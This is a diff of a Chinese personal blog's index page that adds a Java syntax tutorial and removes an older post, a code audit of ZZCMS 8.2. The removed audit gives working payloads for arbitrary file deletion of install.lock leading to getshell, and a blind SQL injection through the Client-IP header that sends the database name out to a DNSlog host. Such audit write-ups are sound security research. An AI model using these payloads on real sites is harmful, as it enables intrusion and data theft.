@@ -236,6 +236,342 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/08/Java语法基础/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/08/Java语法基础/" itemprop="url">基础知识 | JAVA语法基础<一></a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-08T08:15:41+08:00">
+                2019-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>终于忙完考试了,计划接下来的2周时间除了完成课设外,打算补下Java,读两本课外书,接着更新博客。</p>
+</blockquote>
+<hr>
+<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>Java是一种面向对象程序设计语言,所有的数据类型都是用类描述的,Java程序也是由若干个类组成的,想学好Java,类是必须要掌握的。</p>
+<h3 id="类知识"><a href="#类知识" class="headerlink" title="类知识"></a>类知识</h3><h4 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h4><p>Java中的类分为类声明与类主体    </p>
+<h5 id="类声明"><a href="#类声明" class="headerlink" title="类声明"></a>类声明</h5><pre><code>格式:`修饰符 class 类名 extends 父类名 implements 接口名`        
+修饰符:可选,分为定义类的性质(abstract,final)和访问权限(public和默认等)    
+extends:可选,继承父类,如无指定,默认继承Java.lang.Object,只支持单继承
+implements:可选,用于指明该类实现的接口,允许一个类实现多个接口(,分割)。    
+</code></pre><h5 id="类主体"><a href="#类主体" class="headerlink" title="类主体"></a>类主体</h5><p>包括成员变量与成员方法的定义与实现    </p>
+<h5 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h5><p>格式:<code>变量修饰符 变量类型 变量名</code><br>变量类型为Java语言中任意的数据类型或引用数据类型(类,数组等),成员变量通过其变量修饰符来确定访问权限。</p>
+<h5 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h5><p>格式:<code>方法修饰符 返回类型 方法名(参数列表)</code><br>方法修饰符:public,private,protected,final,static,abstract,synchronized。前三种说明访问权限,public(所有类都可以访问),private(只能被本类访问),protected(允许被相同包的类访问),final(修饰最终方法,被修饰过的方法不允许被子类重载),static(修饰类方法,可直接通过类名调用且不允许重载),abstract(修饰抽象方法,只有方法声明,无方法体),synchronized(修饰用于线程同步)。<br>返回类型:可以是基本数据类型或者自定义类,如不需要返回值,设置其为void即可。<br>方法名与参数列表:符合命名规范即可<br>方法体:定义功能,方法体内可定义局部变量,作用域仅在方法体内。</p>
+<h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><p>当用new一个新对象时,构造方法立即执行,构造方法名必须与类名相同。    </p>
+<pre><code>public 类名(参数列表){}
+</code></pre><p>定义构造方法注意:<br>    1.无返回类型(包括void),修饰符只能为public,private,protected中的任一个<br>    2.不能从父类继承<br>    3.系统默认提供无参构造方法<br>    4.构造方法不能通过方法名直接调用,只能通过new运算符调用。<br>    5.构造方法可以调用当前类(this)或父类的构造方法(super),<code>必须在第一行调用</code>。</p>
+<h4 id="类使用"><a href="#类使用" class="headerlink" title="类使用"></a>类使用</h4><h5 id="类声明-创建"><a href="#类声明-创建" class="headerlink" title="类声明,创建"></a>类声明,创建</h5><p>类是对象模板,只有实例化后才可使用。<br><code>Circle c1</code> //声明<br><code>Circle c1 = new Circle()</code> //new用于创建一个对象的实例并返回对象的引用。<br><code>c1.a(1,2)</code> //调用成员方法a(),参数为1,2    </p>
+<h5 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h5><p>对象不再使用后,Java系统通过垃圾回收器GC,周期性地释放内存,回收工作由Java系统自动完成,减少程序员的工作量。    </p>
+<h4 id="this的使用"><a href="#this的使用" class="headerlink" title="this的使用"></a>this的使用</h4><p>关键字this表示实例对象指向自己的引用,可出现再实例方法与构造方法中,不能出现在由static修饰的类方法(静态方法)。    </p>
+<h5 id="实例方法和构造方法中使用this"><a href="#实例方法和构造方法中使用this" class="headerlink" title="实例方法和构造方法中使用this"></a>实例方法和构造方法中使用this</h5><p>this(color),this.h=h,this.cry() //调用本实例类的构造方法,成员变量与成员方法。</p>
+<h5 id="区分成员变量与局部变量"><a href="#区分成员变量与局部变量" class="headerlink" title="区分成员变量与局部变量"></a>区分成员变量与局部变量</h5><p>成员变量在整个类中都有效,局部变量仅在方法体内有效。<code>在方法体内声明的变量与方法传入的参数称为局部变量。</code>如果在实例方法中的局部变量名字与成员变量名字相同,这个成员变量在这个方法内就会暂时失效(强龙压不过地头蛇),如果确实想引用成员变量,使用this关键字即可。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.11.30.00-image.png" alt="2019-01-08.11.30.00-image.png"></p>
+<h5 id="返回实例对象本身的引用"><a href="#返回实例对象本身的引用" class="headerlink" title="返回实例对象本身的引用"></a>返回实例对象本身的引用</h5><p>this还可以作为成员方法的return语句的参数,用来返回对象本身的引用。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.11.35.39-image.png" alt="2019-01-08.11.35.39-image.png"><br>返回长大后的Dog类。    </p>
+<h5 id="使用this调用类的其他构造方法"><a href="#使用this调用类的其他构造方法" class="headerlink" title="使用this调用类的其他构造方法"></a>使用this调用类的其他构造方法</h5><p>使用this调用其他类的构造方法(this(a)),至于系统具体会调用哪个方法,根据参数的类型与个数决定。    </p>
+<h3 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h3><p>OOP是Java的重点,OOP的三个特性</p>
+<pre><code>封装:用一个类将实现与使用分开,只保留接口与外部进行联系
+继承:字类自动继承其父类的属性与方法,并且可以添加新的属性与方法
+多态:虽然多个子类都有一个共同的方法,但是子类实例化后都可以获得完全不同的结果
+</code></pre><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><pre><code>面向对象程序设计的一个特性就是封装,将实体特征的属性隐藏起来,对象与外界仅通过公共方法进行交流,提高程序的可靠性,安全性与可维护性。数据的隐藏与开放对外的接口可通过访问权限控制符实现,Java提供了public,protected,private和默认4种访问控制符
+public
+    可被同一个或不同包的任何类访问通常只将公共类或公共接口的成员方法组指定为public
+protected
+    可用来修饰类的成员变量与方法,可被本类、本包的其他类访问,也可被其他包的字类继承
+默认
+    用户没有指定,就会自动使用默认权限,只能被本类或其他一个包中的其他类、接口、成员方法引用,也被称为包权限
+pricate
+    声明类的私有成员,被private修饰的成员变量和方法只能被该类自身所访问或修改,而不能被其他类(包括该类的子类)来获取或引用    
+getInfo和setInfo    
+    为了系统设计的安全性考虑,一般将类的成员变量定义为private形式,而将类的成员方法定义为public对外公开。类中提供变量对应的get方法(得到private成员变量)和set方法(修改private成员变量),达到其他类可以操作该类的private成员变量
+</code></pre><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><pre><code>研究生是一类特殊的学生,研究生类在保留学生类的基本属性和行为的基础上,可以增加新的属性与行为,也可以修改学生的属性和行为。这里学生就是研究生的父类(或超类),研究生为学生的子类。父类派生子类,子类继承父类,子类也可以派生其他类,这样就构成了类的层次结构。继承机制可提高系统的可扩展性与可维护性。
+</code></pre><h5 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h5><pre><code>class Graduate extends Student{    
+使用extends关键字实现类的继承,如果类定义没有使用extends关键字,则默认该类的父类为java.lang.Object,Object类是Java预定义的所有类的父类，包含所有的Java使用的公共属性其中定义的属性与方法均可被任何类使用 继承或修改。Java只能继承一个父类(单继承),子类继承父类的变量和方法,可以增加父类没有的变量或方法,也可以修改已有的变量或方法。
+用Eclipse打开Java文件,连按两次Ctrl+o,可得到当前类与父类的属性,方法:    
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2019-01-07.19.45.34-image.png" alt="2019-01-07.19.45.34-image.png"><br>    <code>子类可以继承父类的成员属性与方法,但受访问权限的限制。如父类与子类在不同的包中定义,子类只能public与protected权限的变量,如果父类与子类在一个包中定义,子类能访问父类的public,protected与默认权限的变量,如果要访问private类型的变量,只能使用其父类的set与get方法访问。</code></p>
+<h5 id="super的使用"><a href="#super的使用" class="headerlink" title="super的使用"></a>super的使用</h5><p>子类在继承父类的属性与方法时,可能会出现变量隐藏(变量的名相同,类型不要求)或方法覆盖(子类与父类的方法名,返回类型,入口参数的数目,类型,顺序相同,只是实现的功能不同)。此时父类的变量与方法就会被覆盖,如需要调用父类被隐藏的属性与方法,可通过<code>super</code>关键字调用<br>eg:</p>
+<pre><code>public class Student{
+  public static void main(String[] args) {
+      AClass aClass = new AClass();
+      BClass bClass = new BClass();
+
+      aClass.p1();
+      bClass.p1();
+      }
+}
+public class AClass {
+    int a;
+    float a1;
+
+    public AClass() {
+        a = 50;
+        a1 = 99.99f;
+    }
+    public void p1() {
+        System.out.println(&quot;method A&quot;);
+        System.out.println(&quot;a=&quot;+a);
+        }
+}
+public class BClass extends AClass{
+    int a;    //与父类的成员变量名相同,属于变量隐藏
+    public BClass() {
+      a = 10;
+      a1 = 123.6f;
+  }
+    public void p1() {    //与父类的成员方法相同,属于方法覆盖现象
+      System.out.println(&quot;method b&quot;);
+      System.out.println(&quot;a=&quot;+a);    //这里的a是bClass的变量a
+      super.p1();     //通过super调用被覆盖的父类成员方法
+      System.out.println(&quot;super.a=&quot;+super.a);    //通过super访问被隐藏的父类成员变量
+  }
+}
+</code></pre><p>   运行结果:</p>
+<pre><code>   method A
+a=50
+method b
+a=10
+method A
+a=50
+super.a=50
+</code></pre><p><code>super</code>除上述的2种作用,还可显示调用父类构造方法。<br>    实例方法与构造方法的super关键字都指向父类,实例方法中的super关键字是去调用父类中的某个方法,而构造方法中使用是去调用父类的构造方法。</p>
+<h5 id="子类对象的构造"><a href="#子类对象的构造" class="headerlink" title="子类对象的构造"></a>子类对象的构造</h5><p>当子类创建时,系统默认自动(显式或隐式)调用父类的无参构造方法。需要注意的是,如果父类定义了有参数的构造方法,系统就不会再提供默认的无参构造方法,此时子类一定要避免使用父类的无参构造方法。<br>调用构造方法时,遵循的规则:<br>    1.创建对象时,调用该类的父类构造方法(将第一条写为super语句即可),super可以调用父类的任何一个带参数或不带参数的构造方法。<br>    2.如果类的构造方法中第一条语句没有使用super,则编译器也会默认用super()调用父类的无参构造方法。<br>    3.用this()调用本类的构造方法。<br>    4.如父类定义了有参构造方法,子类的构造方法一定要super显式调用父类的有参构造方法。<br>所以说,在定义一个类时,如果没有特殊需求,尽量在类中定义一个无参的构造方法,防止被继承时出现错误。</p>
+<h5 id="对象类型转换"><a href="#对象类型转换" class="headerlink" title="对象类型转换"></a>对象类型转换</h5><pre><code>如同数据类型的转换,对象也可以在一定范围内进行转换,由于子类具有父类的方法与属性,因此子类对象可以向上转化为父类对象(上转型对象)
+ SuperClass spc = new SubClass(); //SubClass是SuperClass的子类,父类引用指向对象实例
+SubClass sbc = new SuperClass(); //错误 因为父类不一定含有子类的属性与方法
+</code></pre><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><pre><code>方法重载与方法覆盖是是实现继承的基本手段。重载只是方法的名字相同,而参数(参数类型,参数个数),方法覆盖是指子类的方法名与父类的方法名完全相同(参数类型,个数,返回值类型),即在子类重写了父类的方法,这样就能使用相同的方法名实现不同的功能。
+
+class Animal{
+    public void enjoy(){
+
+    }
+}
+class Cat extends Animal{
+    public void enjoy(){
+        System.out.println(&quot;Cat....&quot;);
+    }
+}
+class Dog extends Animal{
+    public void enjoy(){
+        System.out.println(&quot;Dog....&quot;);
+    }
+}
+public class Testpolymoph{
+
+  public static void main(String[] args){
+      Testpolymoph test = new Testpolymoph();
+      Cat cat = new Cat();
+      Dog dog = new Dog();
+      test.myEnjoy(cat);
+      test.myEnjoy(dog);
+  }
+
+  public void myEnjoy(Animal pet){
+      pet.enjoy();
+  }
+
+}
+</code></pre><p>运行结果:</p>
+<pre><code>用一个enjoy()方法就实现了不同的对象所需的操作,即不修改程序代码就可以改变程序运行时所绑定的具体代码,让程序可以选择多个运行状态,这就是实现了多态型。(像是定义一个方法,传入的参数是不同的对象,然后执行不同对象相应的相同名的成员方法)
+</code></pre><h3 id="非访问控制符"><a href="#非访问控制符" class="headerlink" title="非访问控制符"></a>非访问控制符</h3><pre><code>类定义的时候除了可以使用public,private,protected和默认来设置成员变量与成员方法的访问权限,还可以使用static,final,abstract来说明其特性。 
+</code></pre><h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><h5 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h5><pre><code>被static修饰的成员变量或成员方法称为类变量(静态变量)和类方法(静态方法)。没有被static修饰的称为实例变量和实例方法。
+实例变量依附于对象,不同实例变量占用不同的内存空间。类变量依附于类,占用公共空间,该类的每个实例对象共享同一变量的存储空间,每个对象对类变量的修改都会影响其他实例对象。
+public class Student{
+    public static void main(String[] args) {
+      System.out.println(&quot;现在的人数:&quot;+AClass.personnum);
+      AClass aClass1 = new AClass();
+      AClass aClass2 = new AClass();
+      System.out.println(&quot;现在的人数:&quot;+AClass.personnum);
+      System.out.println(&quot;现在的人数:&quot;+aClass2.personnum);
+    }
+}
+public class AClass {
+  static int personnum = 100;
+
+  public AClass() {
+      personnum ++;
+  }
+}
+</code></pre><p>输出结果:<br>    现在的人数:100<br>    现在的人数:102<br>    现在的人数:102<br>每次创建AClass的实例时,调用其构造方法使其personnum加1,因此personnum可以记录所产生的实例对象的个数。可通过类名(AClass.personnum)实例对象名(aClass2.personnum)访问变量。且每个对象对静态变量personnum的修改都会影响其他实例对象。</p>
+<h5 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h5><pre><code>类方法的本质是该方法属于整个类,而不是某个实例,可以不创建实例,直接通过类名调用(AClass.add(1,1))。
+
+类方法的特点：
+    1.可直接调用,不需要创建实例对象,例如,Java Application的入口main()方法被声明为static类方法,不需要创建任何实例对象即可调用。
+    2.类方法属于整个类,被调用时可能还没有创建任何实例对象实例,因此,类方法只能访问类变量,而不能直接访问实例变量或实例方法。
+    3.类方法中不能使用this关键字,因为静态方法不属于任何一个实例。
+</code></pre><p>eg:</p>
+<pre><code>public class Student{
+    public static void main(String[] args) {
+        System.out.println(&quot;sum&quot;+AClass.sum(3, 1));
+        //System.out.println(&quot;sub&quot;+AClass.sub(3,1));  会报错,不能直接调用实例方法
+    }
+}
+public class AClass {
+  //static int personnum = 100;
+  int z = 3;
+
+  public static int sum(int a,int b) {
+      //return z; 会报错,因为类方法中只能使用类变量,不能使用实例变量。
+      return a+b;
+  }
+
+  public int sub(int a,int b) {
+      return a-b;
+  }
+
+}
+</code></pre><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><pre><code>final可以修饰类,成员变量,成员方法,被final修饰过类,变量,方法的均不允许继承或覆盖。
+</code></pre><h5 id="final修饰类"><a href="#final修饰类" class="headerlink" title="final修饰类"></a>final修饰类</h5><pre><code>被final修饰过的类称为最终类,它不可能有子类。
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.09.58.52-image.png" alt="2019-01-08.09.58.52-image.png"></p>
+<h5 id="final修饰方法"><a href="#final修饰方法" class="headerlink" title="final修饰方法"></a>final修饰方法</h5><blockquote>
+<p>使用final方法的原因有两个。第一个原因是把方法锁定，以防任何继承类修改它的含义；第二个原因是效率。在早期的Java实现版本中，会将final方法转为内嵌调用。但是如果方法过于庞大，可能看不到内嵌调用带来的任何性能提升。在最近的Java版本中，不需要使用final方法进行这些优化了    </p>
+</blockquote>
+<p>因此,只有在想明确禁止该方法在子类中被覆盖的情况下才将方法设置为final。    </p>
+<h5 id="final修饰变量"><a href="#final修饰变量" class="headerlink" title="final修饰变量"></a>final修饰变量</h5><h6 id="final修饰普通变量"><a href="#final修饰普通变量" class="headerlink" title="final修饰普通变量"></a>final修饰普通变量</h6><pre><code>被final修饰的变量称为常量,不允许修改
+final int a = 3;a = 2;  //编译器会报错
+</code></pre><h5 id="final修饰引用变量"><a href="#final修饰引用变量" class="headerlink" title="final修饰引用变量"></a>final修饰引用变量</h5><pre><code>当使用final修饰引用类型变量时，它仅仅保证他的地址不变，即一直引用同一个对象，但这个对象完全可以发生改变
+</code></pre><h4 id="其他修饰符"><a href="#其他修饰符" class="headerlink" title="其他修饰符"></a>其他修饰符</h4><h5 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h5><pre><code>主要用于多线程程序的协调和同步,如果某个方法被该关键字修饰,意味着不管哪个县城运行到这个方法时,都要检查有没有线程正在用这个方法,若有,则要等到正在使用的线程结束后,再运行此线程,如无,则直接运行。
+</code></pre><h3 id="抽象类与接口"><a href="#抽象类与接口" class="headerlink" title="抽象类与接口"></a>抽象类与接口</h3><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p>先了解以下抽象方法，抽象方法是一种特殊的方法:他只有声明,而没有具体的实现,由它的子类去实现。同时抽象类提供了继承的概念,它的出发点是为了继承,否则它也没有存在的意义<br>抽象方法的声明格式:<code>abstract void fun();</code>如果一个类含有抽象方法,则称这个类为抽象类。<br>定义:如果一个类中没有包含足够的信息来描述具体的对象,<br>格式:<code>abstract class 类名 extends 父类 implements 接口名</code><br>eg:</p>
+<pre><code>public abstract class Animal {
+    public abstract void cry();
+}
+
+public class Cat extends Animal{
+
+    @Override
+    public void cry() {
+        System.out.println(&quot;喵喵&quot;);
+    }
+}
+
+public class Dog extends Animal{
+
+    @Override
+    public void cry() {
+        System.out.println(&quot;汪汪&quot;);
+    }
+
+}
+
+public class Test {
+
+    public static void main(String[] args) {
+        Animal a1 = new Cat();
+        Animal a2 = new Dog();
+
+        a1.cry();
+        a2.cry();
+    }
+</code></pre><p>结果:<br>    喵喵喵<br>    汪汪汪<br>代码定义了一个抽象类Animal,必须提供抽象方法cry(),猫,狗都是动物的子类,由于cry为抽象方法,所以Cat,Dog必须实现cry</p>
+<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>接口在Java中是一个抽象集合,是抽象方法的集合。用来建立类与类之间的协议,它所提供的仅仅是一种协议,没有具体的实现,实现该接口的实现类必须实现该接口的所有方法,通过使用implements,表示遵循某个特定的接口。<br>接口是抽象类的延伸,一个类可以实现多个接口,弥补了类不能多继承的缺陷,一般抽象类与接口配合使用,既可以保证数据安全性又可以实现多继承。<br>注意:接口的所有方法的访问权限被系统自动定义为public,实现接口的非抽象类必须实现该接口的所有方法    </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/09/java_Servlet基础/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -580,7 +916,7 @@ PrintWriter out = response.getWriter();   //在response.getWriter()前设置编�
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/11/19/java_web_JSP技术/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2018/11/19/java_web_JSP技术/" itemprop="url">基础知识 | JSP基础</a></h1>
         
 
         <div class="post-meta">
@@ -592,7 +928,7 @@ PrintWriter out = response.getWriter();   //在response.getWriter()前设置编�
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-19T21:36:16+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-19T08:15:41+08:00">
                 2018-11-19
               </time>
             
@@ -632,11 +968,7 @@ PrintWriter out = response.getWriter();   //在response.getWriter()前设置编�
       
         
           
-            <hr>
-<p>title: 基础知识 | JSP基础<br>date: 2018-11-19 08:15:41<br>tags: JSP</p>
-<hr>
-<hr>
-<h2 id="JSP技术"><a href="#JSP技术" class="headerlink" title="JSP技术"></a>JSP技术</h2><h3 id="JSP基本语法"><a href="#JSP基本语法" class="headerlink" title="JSP基本语法"></a>JSP基本语法</h3><blockquote>
+            <h2 id="JSP技术"><a href="#JSP技术" class="headerlink" title="JSP技术"></a>JSP技术</h2><h3 id="JSP基本语法"><a href="#JSP基本语法" class="headerlink" title="JSP基本语法"></a>JSP基本语法</h3><blockquote>
 <p>JSP = HTML + Java代码 + JSP标签<br>  Java代码:Java脚本 声明 表达式<br>  JSP标签:指令 动作 注释    </p>
 </blockquote>
 <h4 id="JSP脚本元素"><a href="#JSP脚本元素" class="headerlink" title="JSP脚本元素"></a>JSP脚本元素</h4><p>脚本元素主要包含3种类型:</p>
@@ -2786,202 +3118,6 @@ $passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;;
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/25/ZZCMSV8.2详细审计/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/25/ZZCMSV8.2详细审计/" itemprop="url">代码审计 | ZZCMSV8.2详细审计</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-25T08:15:41+08:00">
-                2018-10-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>##<strong>1.安装时配置文件可写入命令导致Getshell</strong>(需要<code>magic_qupte_gpc</code>为<code>off</code>状态)<br>一般这种重装时出现的漏洞,需要配合其他漏洞才能发挥作用(如任意文件删除<code>lock</code>文件导致重装):<br>详情可看笔者发到ichunqiu的文章:<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44383&amp;page=1#pid500791" target="_blank" rel="noopener">ZZCMS 从任意文件删除至getshell</a></p>
-<p>##<strong>2.多处任意文件删除:</strong><br>这是ZZCMS8.2关于文件操作部分的代码:</p>
-<pre><code>A.
-if ($oldimg&lt;&gt;$img){
-        $f=&quot;../&quot;.$oldimg;
-        if (file_exists($f)){
-        unlink($f);        
-        }
-}
-
-
-B.
-if ($row[&apos;img&apos;]&lt;&gt;&quot;/image/nopic.gif&quot;){
-        $f=&quot;../&quot;.substr($row[&apos;img&apos;],1);
-        if (file_exists($f)){
-        unlink($f);
-        }
-</code></pre><p>  在前台的文件删除最多的就是这两种删除情况,A代码没有对传入的<code>$oldimg</code>进行过滤导致任意文件删除,而B是从数据库提取<code>$row[&#39;img&#39;]</code>再进行删除,经测试,在该CMS中都会造成文件删除。这里只列出漏洞文件与漏洞利用条件,因为代码无外乎上面那两段。</p>
-<p><strong>漏洞利用:</strong><br>A代码部分<br>1.<code>user\adv.php(modify与add方式都存在)</code>payload：</p>
-<pre><code>127.0.0.1:81/user/adv.php?$action=modify
-post:oldimg=install/install.lock
-</code></pre><p>2.<code>licence_save.php(随意添加一个资质,得到id为1)</code>payload：</p>
-<pre><code>http://127.0.0.1:81/user/licence_save.php?action=modify
-post：oldimg=install/install.lock&amp;id=1
-</code></pre><p>在实战中可以直接爆破得到id。<br>另外涉及的文件还有<code>user\manage.php</code>  <code>user\ppsave.php</code>  <code>user\zssave.php</code> <code>ztconfig.php</code></p>
-<p>B代码部分<br>与A的利用方式不同的是,他这里的<code>$row[&#39;img&#39;]</code>是从数据库中提取的,那我们要利用这里进行文件删除的话就需要先把脏数据(要删除的文件)写入数据库,然后再去删除。</p>
-<p>我这里也找到几处存在问题的地方：<br>1.<code>user\del.php:</code><br><img src="http://static.zybuluo.com/chhyx/mrzy5zfl10c4uulo7yitzvht/image_1cqipr8rc1tro19ucr1aql41i1p87.png" alt="image_1cqipr8rc1tro19ucr1aql41i1p87.png-99.5kB"></p>
-<p>那我们就需要找一下在哪里可以插入或者修改zzcms_main表中的img字段值的地方:<br>在<code>user\zssave.php</code>中找见:<br><img src="http://static.zybuluo.com/chhyx/p19ih7qu5a3h93k4e9zqmrp0/image_1cqipskup1f3i13hmmbp1tcc1om48k.png" alt="image_1cqipskup1f3i13hmmbp1tcc1om48k.png-57.4kB"></p>
-<p>那利用就很简单了:<br>先访问:<code>http://127.0.0.1:81/user/zssave.php</code><br>添加时将<code>$img</code>值(或<code>$flv</code>)改为想删除的文件<code>xinstall/install.lock</code>(从下标为1开始取值)<br>然后再访问:</p>
-<pre><code>http://127.0.0.1:81/user/del.php   
-post:id=1&amp;tablename=zzcms_main
-</code></pre><p>即可成功删除<code>install.lock</code>文件,这里的<code>id</code>同样需要爆破</p>
-<p>在<code>user\del.php</code>这个文件下另外一处:</p>
-<p><img src="http://static.zybuluo.com/chhyx/2br5zkprbcxioqp7w223w9h1/image_1cqip94rk1hrtkj2q7u19ud12r63d.png" alt="image_1cqip94rk1hrtkj2q7u19ud12r63d.png-69.5kB"></p>
-<p>在<code>licence_sace.php</code>有往<code>zzcms_licence</code>表写数据的操作<br><img src="http://static.zybuluo.com/chhyx/skavh97q5jwknwnxeybg8p5y/image_1cqipe3aq3iavumtf215i777g6q.png" alt="image_1cqipe3aq3iavumtf215i777g6q.png-118.8kB"><br>操作同上即可利用。</p>
-<p>##<strong>3.多处Sql注入:</strong><br><strong>A.HTTP_CLIENT_IP 注入</strong><br>获取ip的函数<code>getip()</code>无过滤,与笔者前几天分析的<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">代码审计 | APPCMS详细审计</a>中的注入类似。</p>
-<pre><code>#inc\function.php    getip()
-function getip(){ 
-if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) 
-$ip = getenv(&quot;HTTP_CLIENT_IP&quot;); 
-else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) 
-$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); 
-else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) 
-$ip = getenv(&quot;REMOTE_ADDR&quot;); 
-else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) 
-$ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; 
-else 
-$ip = &quot;unknown&quot;; 
-return ($ip); 
-} 
-</code></pre><p>然后直接搜索用到<code>getip()</code>函数的地方进行利用。</p>
-<pre><code>user\logincheck.php
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/syx67osq7fldj7gt1kzbasgk/image_1cqir6v841j0be6219ru1gheu259e.png" alt="image_1cqir6v841j0be6219ru1gheu259e.png-131.4kB"></p>
-<p>因为这里时无回显的盲注,我们用DNSlog来快速获取数据,<br>不清楚怎么使用的可参考笔者之前的文章。</p>
-<pre><code>client-ip: 1.1.1.1&apos; and ((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxxxx.ceye.io\\abc&apos;))))#
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/9gyfrk1tgqc2p1dac1e5hea8/image_1cqis1ttj13t7uibddvstn1kbb9r.png" alt="image_1cqis1ttj13t7uibddvstn1kbb9r.png-104.1kB"></p>
-<p>剩下的还有几处利用点,但大多类似,就不再赘述。</p>
-<p><strong>B.$tablename注入</strong><br>将传入的变量<code>$tablename</code>直接拼接到sql语句中,且无引号包裹,<br><img src="http://static.zybuluo.com/chhyx/25nmbl349o2copgl8mym97tv/image_1cqkek8v7b68ib12kb1k691kjq9.png" alt="image_1cqkek8v7b68ib12kb1k691kjq9.png-18.1kB"></p>
-<p>因为这里并无回显,所以只能利用延时注入或者dnslog带入的方式</p>
